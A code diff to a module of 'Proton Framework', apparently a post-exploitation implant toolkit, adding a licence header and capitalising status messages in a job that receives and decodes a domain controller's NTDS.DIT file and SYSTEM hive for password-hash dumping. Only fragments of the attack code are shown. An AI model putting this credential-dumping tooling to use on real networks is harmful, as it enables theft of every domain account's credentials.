@@ -1,3 +1,23 @@
+#!/usr/bin/env python3
+
+#            ---------------------------------------------------
+#                             Proton Framework              
+#            ---------------------------------------------------
+#                Copyright (C) <2019-2020>  <Entynetproject>
+#
+#        This program is free software: you can redistribute it and/or modify
+#        it under the terms of the GNU General Public License as published by
+#        the Free Software Foundation, either version 3 of the License, or
+#        any later version.
+#
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+#        GNU General Public License for more details.
+#
+#        You should have received a copy of the GNU General Public License
+#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 import core.implant
 import uuid
 
@@ -103,7 +123,7 @@ class HashDumpDCJob(core.job.Job):
         if task == self.options.get("SYSHFILE"):
             handler.reply(200)
 
-            self.print_status("received SYSTEM hive (%d bytes)" % len(data))
+            self.print_status("Received SYSTEM hive (%d bytes)" % len(data))
             self.system_data = data
             self.system_encoder = handler.get_header("encoder", False)
             return
@@ -111,7 +131,7 @@ class HashDumpDCJob(core.job.Job):
         if task == self.options.get("NTDSFILE"):
             handler.reply(200)
 
-            self.print_status("received NTDS.DIT file (%d bytes)" % len(data))
+            self.print_status("Received NTDS.DIT file (%d bytes)" % len(data))
             self.ntds_data = data
             self.ntds_encoder = handler.get_header("encoder", False)
             return
@@ -125,10 +145,10 @@ class HashDumpDCJob(core.job.Job):
 
     def finish_up(self):
         self.ntds_file = self.save_file(self.ntds_data, 'NTDS', self.ntds_encoder)
-        self.print_status("decoded NTDS.DIT file (%s)" % self.ntds_file)
+        self.print_status("Decoded NTDS.DIT file (%s)" % self.ntds_file)
 
         self.system_file = self.save_file(self.system_data, 'SYSTEM', self.system_encoder)
-        self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
+        self.print_status("Decoded SYSTEM hive (%s)" % self.system_file)
 
         from subprocess import Popen, PIPE, STDOUT
 
